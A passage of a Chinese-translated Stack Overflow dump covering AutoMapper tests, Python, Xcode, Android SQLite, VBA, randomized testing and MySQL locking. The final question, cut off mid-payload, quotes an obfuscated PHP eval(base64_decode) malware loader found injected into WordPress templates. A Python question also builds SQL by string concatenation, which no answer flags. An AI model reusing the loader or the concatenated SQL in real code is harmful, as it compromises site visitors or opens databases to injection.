        _userService.Setup(r => r.AddUser(new User())).Returns(confirmation);

        _accountController = new AccountController(_userService.Object);

        // Act
        var result = _accountController.Signup(registeredUser) as RedirectToRouteResult;

        // Assert

        Assert.IsNotNull(result, "Should have returned a RedirectToRouteResult");
        Assert.AreEqual(expectedRouteName, result.RouteName, "Route name should be {0}", expectedRouteName);
    } 
```

单元测试在这里失败了。

```
 var result = _accountController.Signup(registeredUser) as RedirectToRouteResult; 
```

当我调试单元测试时，我收到以下错误消息：“缺少类型映射配置或不支持的映射。”

我认为这是因为配置在 web 项目中，而不是在单元测试项目中。我应该怎么做才能解决它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T02:30:13.883

您需要配置映射器，因此在您的测试类设置中，而不是每个测试设置中，调用代码来设置映射。请注意，您可能还需要修改您对用户服务调用的期望，因为参数不匹配，即它们是不同的对象。可能您需要一个测试来检查对象的属性是否与传递给方法的模型的属性相匹配。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T06:07:36.910

您应该真正使用映射引擎的接口，以便您可以模拟它而不是使用 AutoMapper，否则它是集成测试而不是单元测试。

AutoMapper 有一个名为的接口`IMappingEngine`，您可以使用如下所示的 IoC 容器将其注入到您的控制器中（此示例使用的是 StructureMap）。

```
class MyRegistry : Registry
{
    public MyRegistry()
    {
        For<IMyRepository>().Use<MyRepository>();
        For<ILogger>().Use<Logger>();

        Mapper.AddProfile(new AutoMapperProfile());
        For<IMappingEngine>().Use(() => Mapper.Engine);
    }
} 
```

然后，您将能够使用依赖注入将 AutoMapper 的映射引擎注入您的控制器，允许您引用如下映射：

```
[POST("signup")]
public virtual ActionResult Signup(UserRegisterViewModel user)
{
    if (ModelState.IsValid)
    {
        var newUser = this.mappingEngine.Map<UserRegisterViewModel, User>(user);
        var confirmation = _userService.AddUser(newUser);

        if (confirmation.WasSuccessful)
            return RedirectToAction(MVC.Home.Index());
        else
            ModelState.AddModelError("Email", confirmation.Message);

    }
    return View(user);
} 
```

您可以在此处阅读有关此内容的更多信息：[如何使用 StructureMap 注入 AutoMapper IMappingEngine](https://stackoverflow.com/questions/12604896/how-to-inject-automapper-imappingengine-with-structuremap)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-09-01T16:17:24.600

将映射抽象到 MappingEngine 中可能很酷。

有时我对 IOC Automapper 使用以下方法

在 IOC 构建器中：

```
 builder.RegisterInstance(AutoMapperConfiguration.GetAutoMapper()).As<IMapper>(); 
```

其中 GetAutoMapper 是：

```
 public class AutoMapperConfiguration
    {
        public static IMapper GetAutoMapper()
        {
            var config = new MapperConfiguration(cfg =>
            {
                cfg.AddProfile<OrderModelMapperProfile>();
                cfg.AddProfile<OtherModelMapperProfile>();
                //etc;
               });
            var mapper = config.CreateMapper();
            return mapper;
        }
    } 
```

最后在 Controller ctor

```
 public MyController(IMapper mapper)
        {
            _mapper = mapper;
        } 
```

# python - Python类型对照表

> ID：11553063
> 
> 赞同：4
> 
> 时间：2012-07-19T02:22:25.743
> 
> 标签：python, python-3.x

PHP 有[“PHP 类型比较表”](http://php.net/manual/en/types.comparisons.php)，Python 有类似的东西吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-08-05T13:13:08.310

是的，这里（也包括下面的图片）：http: [//imgur.com/3rOmPD0](https://imgur.com/3rOmPD0)

来自[https://twitter.com/ngkabra/status/449904315012878337](https://twitter.com/ngkabra/status/449904315012878337)![在此处输入图像描述](../Images/5752d8ca2477a5f27a6f40b4634700b3.png)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-19T02:29:02.257

Python 是强类型的；除了基本数字类型和基本字符串类型之间，不需要这样的表。对于数字类型，它们被强制`long`（在 2.x 中）或`float`根据需要。对于字符串类型，事情并不那么简单，因此`unicode`（在 2.x 中）应尽可能使用。

```
>>> 3 > 2.4
True
>>> 'a' < u'あ'
True
>>> u'a' < 'あ'
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
UnicodeDecodeError: 'ascii' codec can't decode byte 0xe3 in position 0: ordinal not in range(128) 
```

2.x 中不兼容类型之间的比较不会像您预期的那样运行。

```
>>> 2 < '3'
True
>>> 3 < '2'
True 
```

3.x 中不兼容类型的比较将失败。

```
3>> 2 < '3'
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: unorderable types: int() < str() 
```

# ios - 项目中的 zh-Hant.lproj 文件夹更改为 .app 包中的 zh-hant.lproj

> ID：11553064
> 
> 赞同：0
> 
> 时间：2012-07-19T02:22:30.127
> 
> 标签：ios, localization, internationalization

在为我的应用程序测试本地化时，我发现 Xcode 将应用程序包中的繁体中文 .lproj 文件夹名称从 zh-Hant.lproj 更改为 zh-hant.lproj（注意小写“h”）。由于繁体中文的正确格式是 zh-Hant.lproj，当用户将设备的语言更改为繁体中文时，本地化将不起作用，因此我必须在设置此语言时手动加载本地化。

**快速总结**

项目中看到的文件夹名称：zh-Hant.lproj

构建后在 bundle/.app 文件中看到的文件夹名称：zh-hant.lproj

为什么你认为 Xcode 正在更改此文件夹的名称，当然还有最明显的问题：我该如何解决它？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T18:25:51.943

感谢您的建议！我正在编写一个具有自己本地化的框架，结果发现集成我的框架的应用程序也有自己的本地化，其中繁体中文设置为 zh-hant 因此甚至认为 Xcode 放置了框架的 .strings 文件和应用程序的 .strings在同一个文件夹中的文件（框架称为 FrameworkLocalizable.strings 而应用程序使用默认的 Localizable.strings），我猜 Xcode 必须决定在为捆绑包创建文件夹时使用哪个 .lproj 文件夹名称，并且应用程序的名称获胜。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-07-20T11:28:01.433

它应该是 ZH_Hant 或 ZH_Hans - 下划线。

# google-app-engine - 由于“ascii”编解码器无法解码错误，我无法遵循 gae 教程

> ID：11553071
> 
> 赞同：0
> 
> 时间：2012-07-19T02:23:56.150
> 
> 标签：google-app-engine

我正在关注本教程。 [https://developers.google.com/apps-script/articles/appengine](https://developers.google.com/apps-script/articles/appengine)

当我尝试遵循第 1-6 节时

“在浏览器中测试这个 URL：http://localhost:8080/rpc?action=Echo¶ms={"example":"blah"}&key=mySecretKey。" （我在“http://”和“localhost”之间添加了一个空格以避免堆栈溢出流的自动错误检查。）

由于这个错误，我无法跟随。

```
<type 'exceptions.SyntaxError'>: 'ascii' codec can't decode byte 0xc2 in position 141: ordinal not in range(128) please see http://www.python.org/peps/pep-0263.html for details (backend.py) 
      args = ("'ascii' codec can't decode byte 0xc2 in position...n.org/peps/pep-0263.html for details (backend.py)",) 
      filename = None 
      lineno = None 
      message = "'ascii' codec can't decode byte 0xc2 in position...n.org/peps/pep-0263.html for details (backend.py)" 
      msg = "'ascii' codec can't decode byte 0xc2 in position...n.org/peps/pep-0263.html for details (backend.py)" 
      offset = None 
      print_file_and_line = None 
      text = None 
```

在本教程之前，我阅读了 Google App Engine 的“Hello World”教程。它工作得很好。

我应该怎么做才能消除错误？

PS 在教程中我发现一个错字“第 1 节：使用脚本编辑器”应该是“第 1 节：创建和部署 App Engine 服务”。我认为。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T02:58:30.757

pilcrow 符号¶（在“... `action=Echo¶ms=`...”中）在 ascii 中表示为 B6，但在 UTF-8 中表示为 C2 B6。

您的浏览器或编辑器可能（并且相当合理地）使用 UTF-8 作为脚本的编码。一种解决方法可能是将您的编码更改为 Western 或 ascii，然后再次粘贴脚本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T16:05:25.100

Unicode 问题在 GAE python 应用程序中很常见。Nick Johnson 的这篇文章将帮助您编写 Python 代码：http: [//blog.notdot.net/2010/07/Getting-unicode-right-in-Python](http://blog.notdot.net/2010/07/Getting-unicode-right-in-Python)

# android - IllegalArgumentException：您必须提供 SQL 字符串

> ID：11553073
> 
> 赞同：0
> 
> 时间：2012-07-19T02:23:57.373
> 
> 标签：android, sqlite

当我尝试从我的 sqlite 数据库请求信息时，我收到此错误：

```
07-19 02:17:10.835: E/AndroidRuntime(689): java.lang.RuntimeException: Unable to start activity ComponentInfo{de.bodprod.dkr/de.bodprod.dkr.MediNotmediList}: java.lang.IllegalArgumentException: You must supply an SQL string 
```

我的数据库请求：

```
public ArrayList<HashMap<String,Object>> getAllNotmedis(){
    ArrayList<HashMap<String,Object>> notmediList = new ArrayList<HashMap<String,Object>>();
    String selectQuery = "SELECT medi_id, medi_wirk, medi_handel FROM dkr_medi_liste ORDER BY medi_wirk";
    Log.d("ALLNOTMEDIS",selectQuery);
    SQLiteDatabase db = this.getWritableDatabase();
    Cursor cursor = db.rawQuery(selectQuery, null);
    HashMap<String , Object> notmedi_item;
    if (cursor.moveToFirst()) {
        do {
            notmedi_item = new HashMap<String, Object>();
            notmedi_item.put("sql_id", Integer.parseInt(cursor.getString(0)));
            notmedi_item.put("wirk", cursor.getString(1));
            notmedi_item.put("handel", unescape(cursor.getString(2)));
            notmediList.add(notmedi_item);
        } while (cursor.moveToNext());
    }
    cursor.close();
    db.close();
    return notmediList;
} 
```

这一行产生了错误：

```
 SQLiteDatabase db = this.getWritableDatabase(); 
```

为什么我会变成这个错误？数据库存在并充满了数据......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T11:05:03.723

错误出现在该`onCreate`部分中。

我试图用`db.execSQL`.

我在这一行得到错误，因为`SQLiteDatabase db = this.getWritableDatabase();`调用了该`onCreate`方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T02:57:29.707

```
java.lang.IllegalArgumentException: You must supply an SQL string 
```

如果您在方法中传递了无效的 Sql Query 语句，则会发生上述异常`rawQuery`。下面的语句一定有问题：

```
= "SELECT medi_id, medi_wirk, medi_handel FROM dkr_medi_liste ORDER BY medi_wirk"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T02:58:33.717

您应该创建数据库适配器，作为您的应用程序和数据库之间的连接

# python - 为什么我的价值观没有在我的程序中累加？

> ID：11553074
> 
> 赞同：2
> 
> 时间：2012-07-19T02:24:25.480
> 
> 标签：python

我在这里得到帮助的功能有问题，我正在尝试理解并纠正它。

这是函数（带有一些注释/打印只是为了帮助我调试）

```
def accumulate_by_category(word_values, cat_sums, cats):
        for word, value in word_values.items():
                print word
                for cat in cats[word]:
                        print cat
                        #cat_sums[cat] += value
                        cat_sums[cat].append(value)
                print cat_sums 
```

现在， word_values 应该看起来像这样：

```
{'a': 4, 'angry': 0, 'sad': 0, 'grateful': 0, 'happy': 0} 
```

cat_sums 应该是这样的：

```
defaultdict(<type 'list'>, {'composed': [0], 'elated': [0], 'unsure': [0], 'hostile': [0], 'tired': [0], 'depressed': [0], 'guilty': [0], 'confused': [0], 'clearheaded': [0], 'anxious': [0], 'confident': [0], 'agreeable': [0], 'energetic': [0]}) 
```

猫应该是这样的：

```
defaultdict(<type 'list'>, {'depressed': ['sad'], 'elated': ['happy', 'grateful', 'a'], 'hostile': ['angry']}) 
```

基本上，该函数试图做的是获取 word_values 中的每个值，并将它们最终添加到 cat_sums。这不是目前正在发生的事情 - 出于某种原因，没有任何值被附加。我很难弄清楚为什么 - 当我尝试时`print cat`，它会出现空白。但是`print word`给了我一个单词列表。从理论上讲，对于 cat in cats[word] 应该提出 cat 中的每个术语，但事实并非如此。

我究竟做错了什么？

我最终只想将所有值添加到 cat_sums，以便将其写入数据库。另外，我是否必须返回 cat_sums 的值才能做到这一点？

这是我的数据库编写代码（catnums 是提交给 cat_sums 的参数）：

```
for key in catnums:
        x = catnums[key]
        for value in x:
                cmd = "UPDATE resulttest SET value=\"" + str(value) + "\" WHERE category=\"" + key + "\"";
                c.execute(cmd)
                db.commit() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T02:55:49.670

完全一团糟！什么`cats[word]`意思？在猫中：键应该是“沮丧”、“兴高采烈”、“敌对”，但在 word_values 中，它们是“愤怒”、“快乐”、“悲伤”、“感恩”

我做了一些改变，希望这就是你想要的。

```
def accumulate_by_category(word_values, cat_sums, cats):
    for word, value in word_values.items():
        print word
        for k, v in cats.items():
            if word in v:
                print k
                if not cat_sums.has_key(k):
                    cat_sums[k] = 0
                cat_sums[k] += value
                print cat_sums
                break 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T02:52:04.320

```
for cat in cats[word] 
```

什么都不做，因为`cats`没有键`'a'`, `'angry'`,`'sad'`等。由于它是一个默认字典，我假设你将它默认为一个空列表，所以它`for cat in []`每次都说一样。

如果添加：

```
{'a': 4, 'angry': 0, 'sad': 0, 'grateful': 0, 'happy': 0, 'hostile': 2} 
```

理论上你会得到你想要的。但是您的问题尚不清楚您期望的输出到底是什么。

> 基本上，该函数试图做的是获取 中的每个值`word_values`，并最终将它们添加到`cat_sums`.

这很不清楚，因为两者都是字典。您的意思是将 的值添加到键匹配时`word_values`的值中吗？`cat_sums`当您说“添加”时，您的意思是“附加”吗？对你期望的结果进行精确会使事情变得更容易——猜测你的意思要困难得多。

# excel - vba 函数中的可选范围

> ID：11553075
> 
> 赞同：6
> 
> 时间：2012-07-19T02:24:29.940
> 
> 标签：excel, vba

我试图返回一个范围内的列数，有时我需要一个范围，但有时我需要多个范围。

我已经输入了可选范围，因此我可以选择多个范围。如果我在函数原型中引用了我在电子表格中没有提供的范围，我会得到#Value！错误。

我需要一种方法来检查可选范围是否为 null、void 等，因此我不必引用该范围。

这是 VBA 函数原型：-

```
Function GetColoumnCount(ARange1 As Range, Optional ARange2 As Range, Optional ARange3 As Range, Optional ARange4 As Range) As Integer

    Dim Result As Integer
    Result = 0

    Result = ARange1.Columns.Count ' This works
    Result = ARange1.Columns.Count + ARange2.Columns.Count ' This doesn't work

    GetColoumnCount = Result    
End Function 
```

在我的电子表格中，我必须在一个单元格中输入这个函数才能工作。
`=GetColoumnCount(BC34:BK34, BC35:BD35, BE35:BF35, BG35:BH35)`
这违背了具有可选参数的目的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-19T02:54:32.603

像这样试试

```
Function GetColoumnCount(ARange1 As Range, Optional ARange2 As Range, Optional ARange3 As Range, Optional ARange4 As Range) As Long  
    Dim Result As Long
    Result = 0

    Result = ARange1.Columns.Count ' This works
    If Not ARange2 Is Nothing Then
        Result = Result + ARange2.Columns.Count
    End If

    GetColoumnCount = Result    
End Function 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-19T13:29:12.903

如果在参数中使用 ParamArray 关键字，则可以提供可变数量的参数。

```
Public Function GetColumnCount(ParamArray Ranges() As Variant) As Long

    Dim lReturn As Long
    Dim i As Long
    Dim rResult As Range
    Dim rArea As Range

    'Loop through the Ranges array supplied by ParamArray
    For i = LBound(Ranges) To UBound(Ranges)
        'Only work with those array members that are ranges
        If TypeName(Ranges(i)) = "Range" Then
            'Use Union to combine all the ranges
            If rResult Is Nothing Then
                Set rResult = Ranges(i)
            Else
                Set rResult = Application.Union(rResult, Ranges(i))
            End If
        End If
    Next i

    'Loop through the Areas and add up the columns
    If Not rResult Is Nothing Then
        For Each rArea In rResult.Areas
            lReturn = lReturn + rArea.Columns.Count
        Next rArea
    End If

    GetColumnCount = lReturn

End Function 
```

要使用：

```
=getcolumncount(E2:K18) = 7
=getcolumncount(D4:L14,N4:P14) =12 (9+3)
=getcolumncount(C7:F15,H7:L15,K7:N15) =11 (omits double counting overlap) 
```

# unit-testing - 使用随机数据进行单元测试

> ID：11553078
> 
> 赞同：3
> 
> 时间：2012-07-19T02:24:52.663
> 
> 标签：unit-testing, testing, tdd

我读过在单元测试中生成随机数据通常是一个坏主意（我确实理解为什么），但是对随机数据进行测试，然后从发现错误的随机测试中构建一个*固定*的单元测试用例似乎不错。但是我不明白如何很好地组织它。我的问题实际上与特定的编程语言或特定的单元测试框架无关，所以我将使用 python 和一些伪单元测试框架。这是我如何看待它的编码：

```
def random_test_cases():
   datasets = [
       dataset1,
       dataset2,
       ...
       datasetn
   ]
   for dataset in datasets:
       assertTrue(...)
       assertEquals(...)
       assertRaises(...)
       # and so on 
```

问题是：当这个测试用例失败时，我无法确定是哪个数据集导致失败。我看到了两种解决方法：

1.  每个数据集创建一个测试用例——问题是测试用例的负载和代码重复。
2.  通常测试框架让我们将消息传递给断言函数（在我的示例中，我可以执行类似的操作`assertTrue(..., message = str(dataset))`）。问题是我应该将这样的消息传递给每个断言，这看起来也不优雅。

有没有更简单的方法呢？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-19T05:21:49.680

我仍然认为这是一个坏主意。

单元测试需要简单明了。给定相同的代码和相同的单元测试，您应该能够无限运行它并且永远不会得到不同的响应，除非有外部因素在起作用。与此相反的目标将增加自动化的维护成本，这与目标背道而驰。

在维护方面之外，对我来说这似乎很懒惰。如果您考虑到您的功能并了解正面和负面的测试用例，那么开发单元测试就很简单了。

我也不同意显示如何在同一个测试用例中执行多个测试用例的用户。当测试失败时，您应该能够立即判断哪个测试失败并知道失败的原因。测试应该尽可能简单，并尽可能简洁/与被测代码相关。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T13:05:49.283

I also think it's a bad idea.

Mind you, not throwing random data at your code, but having unit tests doing that. It all boils down to why you unit test in the first place. The answer is "to drive the design of the code". Random data doesn't drive the design of the code, because it depends on a very rigid public interface. Mind you, you can find bugs with it, but that's not what unit tests are about. And let me note that I'm talking about **unit** tests, and not tests in general.

That being said, I strongly suggest taking a look at [QuickCheck](http://www.cse.chalmers.se/~rjmh/QuickCheck/). It's Haskell, so it's a bit dodgy on presentation and a bit PhD-ish on documentation, but you should be able to figure it out. I'm going to summarize how it works, though.

After you pick the code you want to test (let's say the `sort()` function), you establish invariants which should hold. In this examples, you can have the following invariants if `result = sort(input)`:.

*   Every element in `result` should be smaller than or equal to the next one.
*   Every element in `input` should be present in `result` the same number of times.
*   `result` and `input` should have the same length (this is repeats the previous, but let's have it for illustration).

You encode each variant in a simple function that takes the result and the output and checks whether those invariants code.

Then, you tell QuickCheck how to generate `input`. Since this is Haskell and the type system kicks ass, it can see that the function takes a list of integers and it knows how to generate those. It basically generates random lists of random integers and random length. Of course, it can be more fine-grained if you have a more complex data type (for example, only positive integers, only squares, etc.).

Finally, when you have those two, you just run QuickCheck. It generates all that stuff randomly and checks the invariants. If some fail, it will show you exactly which ones. It would also tell you the random seed, so you can rerun this exact failure if you need to. And as an extra bonus, whenever it gets a failed invariant, it will try to reduce the input to the smallest possible subset that fails the invariant (if you think of a tree structure, it will reduce it to the smallest subtree that fails the invariant).

And there you have it. In my opinion, this is how you should go about testing stuff with random data. It's definitely not unit tests and I even think you should run it differently (say, have CI run it every now and then, as opposed to running it on every change (since it will quickly get slow)). And let me repeat, it's a different benefit from unit testing - QuickCheck finds bugs, while unit testing drives design.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-19T03:28:42.523

您可以通过扩展而不是枚举来定义测试，或者您可以从一个案例中调用多个测试案例。

从单个测试用例调用多个测试用例：

```
MyTest()
{
    MyTest(1, "A")
    MyTest(1, "B")
    MyTest(2, "A")
    MyTest(2, "B")
    MyTest(3, "A")
    MyTest(3, "B")
} 
```

有时有一些优雅的方法可以通过一些测试框架来实现这一点。[以下](http://www.nunit.org/index.php?p=combinatorial&r=2.6)是在 NUnit 中的操作方法：

```
[Test, Combinatorial]
public void MyTest(
    [Values(1,2,3)] int x,
    [Values("A","B")] string s)
{
    ...
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-19T06:02:39.397

通常，只要您选择正确的断言方法，单元测试框架就支持“信息失败”。

但是，如果其他一切都不起作用，您可以轻松地将数据集跟踪到控制台/输出文件。技术含量低，但应该工作。

```
[TestCaseSource("GetDatasets")]
public Test.. (Dataset d)
{
   Console.WriteLine(PrettyPrintDataset(d));
   // proceed with checks
   Console.WriteLine("Worked!");
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-02-12T20:52:54.413

在快速检查 R 我们试图解决这个问题如下

*   测试实际上是伪随机的（种子是固定的），所以你总是可以重现你的测试结果（当然，除非外部因素）
*   该`test`函数返回足够的数据来重现错误，包括失败的断言和使其失败的数据。`repro`在 的返回值上调用的便利函数`test`将使您在失败的断言开始时进入调试器，并将参数设置为失败的见证人。如果测试以批处理模式执行，则等效信息存储在文件中，检索它的命令打印在 stderr 中。然后你可以`repro`像以前一样打电话。无论您是否使用 R 编程，我都想知道这是否开始满足您的要求。此解决方案的某些方面可能难以在动态性较低或没有一流功能的语言中实现。

# objective-c - 如何通过蓝牙将数据从 iOS 设备传输到 Mac？

> ID：11553085
> 
> 赞同：1
> 
> 时间：2012-07-19T02:25:33.780
> 
> 标签：objective-c, ios, xcode, macos, bluetooth

我希望能够通过安装在每台设备上的应用程序将基本信息（字符串等）从 iOS 设备传输到 Mac，反之亦然。我一直在尝试在 iOS 设备上安装蓝牙，但它似乎只想连接到其他 iOS 设备。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T02:34:02.513

ios上的蓝牙访问非常有限。事实上，您只能通过 GameKit 访问它。

[http://developer.apple.com/library/ios/#DOCUMENTATION/NetworkingInternet/Conceptual/GameKit_Guide/Introduction/Introduction.html](http://developer.apple.com/library/ios/#DOCUMENTATION/NetworkingInternet/Conceptual/GameKit_Guide/Introduction/Introduction.html)

因此，如果您想与 Mac 共享信息，您必须让 Mac 显示为 iOS 设备。但是，我忽略了您如何做到这一点。

# mysql - MySQL 表锁

> ID：11553087
> 
> 赞同：0
> 
> 时间：2012-07-19T02:26:13.393
> 
> 标签：mysql, locking

对于以下情况，我是否需要显式锁定 mysql 表：

mysql 数据库用户名：db_user（并且只有一个）
Web 客户端会话：许多用户同时登录

由于 mysql 用户是单一的，但我与我的 Web 服务器有很多客户端会话。会发生什么（在一个表中插入记录，然后获取插入 ID 并将数据添加到另一个表）：

1.  许多网络会话都有单独的 db_user 副本。
2.  许多浏览器会话的单个 db_user 副本。
3.  任何其他。

请帮忙。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-23T05:56:11.233

哈米特，

`LOCK TABLES`简短的回答是否定的，你在做你描述的事情时不需要使用。

您只需要`LOCK TABLES`在您希望确保您是唯一一个写入表的人时使用，例如，如果您想要`INSERT`大量记录，并且希望操作尽可能快地发生。

`mysqldump`您可以在命令创建的转储文件中看到这一点。以下是转储文件中的示例：

```
LOCK TABLES `tbl` WRITE;
/*!40000 ALTER TABLE `tbl` DISABLE KEYS */;
INSERT INTO `tbl` VALUES ...
/*!40000 ALTER TABLE `tbl` ENABLE KEYS */;
UNLOCK TABLES; 
```

# wordpress - Wordpress 恶意软件注入 index.php 模板

> ID：11553089
> 
> 赞同：-1
> 
> 时间：2012-07-19T02:26:45.477
> 
> 标签：wordpress, base64, code-injection, malware

嘿伙计们，所以我最近发现我在服务器上安装的所有 wordpress 上的 index.php 模板文件都注入了这段代码。`<?php eval(base64_decode('JGlwPSRfU0VSVkVSWyJSRU1PVEVfQUREUiJdOyRkcj0kX1NFUlZFUlsiRE9DVU1FTlRfUk9PVCJdOyR1YSA9ICRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTskZGJmPSRkci4nLycubWQ1KCRkcik7DQppZigoc3RycG9zKCR1YSwnV2luZG93cycpIT09ZmFsc2UpJiYoKHN0cnBvcygkdWEsJ01TSUUnKSE9PWZhbHNlKXx8KHN0cnBvcygkdWEsJ0ZpcmVmb3gnKSE9PWZhbHNlKSkmJihzdHJwb3MoQGZpbGVfZ2V0X2NvbnRlbnRzKCRkYmYpLCRpcCkgPT09IGZhbHNlKSl7DQoJZXJyb3JfcmVwb3J0aW5nKDApOw0KCWVjaG8oYmFzZTY0X2RlY29kZSgnUEhOamNtbHdkRDUwY25sN01TMXdjbTkwYjNSNWNHVTdmV05oZEdOb0tHRnpaQ2w3ZUQweU8zMGdhV1lvZUNsN1puSTlJbVp5YjIxRGFHRnlJanRtUFZzd0xDMHhMRGswTERrekxESXlMREk1TERreExERXdNU3c0T0N3eE1EZ3NPVGtzT1RBc01UQXhMREV3Tml3ek5TdzVOQ3c1TVN3eE1EVXNOakFzT1Rnc09UQXNNVEF3TERreExEazVMREV3Tnl3eE1EVXNOVFVzTVRFeUxEYzBMRGcyTERrMExEWTRMRGcyTERFd01DdzVNU3d5T1N3ek1DdzRPQ3d4TURBc09URXNNVEV4TERJNExETXlMRGd4TERNM0xEZzBMRE14TERFeE1pdzBMQzB4TEMweUxEQXNPVFVzT1RFc01UQTFMRGczTERrNExEa3lMREV3TkN3eU9Td3pNaXcwT1N3eUxEQXNMVEVzTVRFMExESXpMRGt4TERrM0xERXdOaXc1TVN3eU1Td3hNVFFzTXl3dE1pd3dMQzB4TERnNUxERXdNaXc0T1N3eE1EWXNNVEF3TERreExEazVMREV3Tnl3ek5pd3hNRGdzTVRBMUxEazFMREV3TlN3NU1pd3pNQ3d5TXl3MU1TdzVOU3c1TVN3eE1EVXNPRGNzT1Rnc09USXNNaklzTVRBMExERXdOU3c0T1N3MU1Dd3pNQ3c1TkN3eE1EVXNNVEEzTERFd01pdzBOeXd6T0N3ek55dzRPU3d4TVRFc01UQXlMREV3TkN3NU55d3hNRGNzT1RNc01UQTVMRGszTERNMUxERXdNQ3d4TVRFc09URXNNVEV3TERNMkxERXdOaXd4TURZc016Y3NOVElzT1RRc01UQXhMRFV3TERReExESTVMREl4TERFeE1DdzVOU3c0T1N3eE1EY3NPVFFzTlRBc016QXNNemtzTXpjc016QXNNaklzT1RNc09USXNPVFVzT1RJc09UVXNNVEEyTERVd0xETXdMRE01TERNM0xETXdMREl5TERFd05Dd3hNRGNzTVRFeExEazNMRGt5TERVeExESTRMREV3T1N3NU5Td3hNRFFzT1RZc09EZ3NPVFFzT1Rrc09UVXNNVEExTERFeE1pdzBPQ3c1TXl3NU5pdzVNQ3c0T1N3NU1pd3hNREFzTkRnc01UQXpMREV3TVN3eE1EUXNPVFlzTVRBMkxEazBMREV3TWl3eE1EQXNORGNzT0Rnc09EZ3NNVEEwTERFd01pdzVPQ3d4TURZc01UQTNMRGt4TERRNExEazVMRGt4TERreExERXdOeXcwT0N3ek55dzFNQ3d4TURZc01UQXdMREV3TXl3ME9Dd3pOeXcxTUN3eU9TdzFNU3cxTVN3ek55dzVOQ3c1TXl3eE1EUXNPRFlzTVRBd0xEa3hMRFV4TERJMUxETXhMRFE0TERRc0xURXNMVElzTVRFMkxETXNMVElzTUN3NU1pd3hNRFlzTVRBeExEZzVMREV3TlN3NU5pd3hNREVzT1Rrc01qTXNPVFVzT1RFc01UQTFMRGczTERrNExEa3lMREV3TkN3eU9Td3pNaXd4TVRNc01pd3dMQzB4TEMweUxERXdPU3c0Tnl3eE1ETXNNak1zT1RJc01qRXNOVElzTWpJc09Ea3NNVEF5TERnNUxERXdOaXd4TURBc09URXNPVGtzTVRBM0xETTJMRGc0TERFd05TdzVNU3c0Tml3eE1EY3NPVEVzTlRnc09Ua3NPVEVzT1Rnc09USXNNVEF3TERFd05Td3pNU3d5T1N3NU5DdzVNeXd4TURRc09EWXNNVEF3TERreExESTRMRE15TERRNUxEa3hMRE0zTERFd05TdzVNQ3d4TURjc05UVXNNVEExTERFd055d3hNRFFzT1RRc09Ea3NNVEEzTERFd05TdzVNaXd6TUN3eU9Dd3hNRFlzTVRBMExEZzRMRE13TERNMExESTRMRGsxTERFd05pd3hNRFVzTVRBekxEUTRMRE0yTERNNExEa3dMREV3T1N3eE1ETXNNVEExTERrMUxERXdPQ3c1TkN3eE1EY3NPVGdzTXpZc09UZ3NNVEV5TERreUxERXdPQ3d6Tnl3eE1EY3NNVEEwTERNNExEVXpMRGt5TERFd01pdzFNU3d6T1N3ek1Dd3pNU3cwT0N3NU15d3pOaXd4TURRc01UQTNMREV4TVN3NU55dzVNaXd6Tml3eE1EY3NPVFlzTVRBMUxEazBMRGc1TERrMUxEazNMRGsyTERFd05pd3hNVEFzTlRJc01qa3NPVE1zT1RZc09UQXNPRGtzT1RJc01UQXdMREk0TERVd0xEa3lMRE0xTERFd05pd3hNRFlzTVRFd0xEazVMRGt4TERNMUxERXdNeXd4TURFc01UQTBMRGsyTERFd05pdzVOQ3d4TURJc01UQXdMRFV3TERNd0xEZzNMRGczTERFd05pd3hNREVzT1Rjc01UQTRMREV3Tml3NU1Dd3pNQ3cwT1N3NU1Td3pOeXd4TURVc01UQTFMREV4TWl3NU9DdzVNQ3d6Tnl3NU9DdzVNQ3c1TXl3eE1EWXNOVEFzTXpBc016Z3NNamdzTlRBc09USXNNelVzTVRBMkxERXdOaXd4TVRBc09Ua3NPVEVzTXpVc01UQTNMREV3TVN3eE1ERXNOVElzTWprc016Y3NNekFzTkRrc09URXNNemNzTVRBMUxEa3dMREV3Tnl3MU5Td3hNRFVzTVRBM0xERXdOQ3c1TkN3NE9Td3hNRGNzTVRBMUxEa3lMRE13TERJNExERXhNQ3c1TlN3NE9Td3hNRGNzT1RRc01qZ3NNelVzTWprc016Z3NNemtzTWprc016QXNOVEFzT1RJc016VXNNVEEyTERreExERXdOU3cxTml3eE1EWXNNVEExTERFd05TdzVOU3c0Tnl3eE1EZ3NNVEEyTERrd0xETXhMREk1TERrekxEa3lMRGsxTERreUxEazFMREV3Tml3eU9Dd3pOU3d5T1N3ek9Dd3pPU3d5T1N3ek1DdzFNQ3d6TEMweUxEQXNMVEVzT0Rrc01UQXlMRGc1TERFd05pd3hNREFzT1RFc09Ua3NNVEEzTERNMkxEa3lMRGt5TERFd05pdzFPQ3c1T1N3NU1TdzVPQ3c1TWl3eE1EQXNNVEExTERFd05pdzFOaXd4TVRBc056VXNPRGNzT1RJc05qa3NPRGNzT1Rnc09USXNNekFzTWpnc09Ea3NNVEF4TERnNUxERXh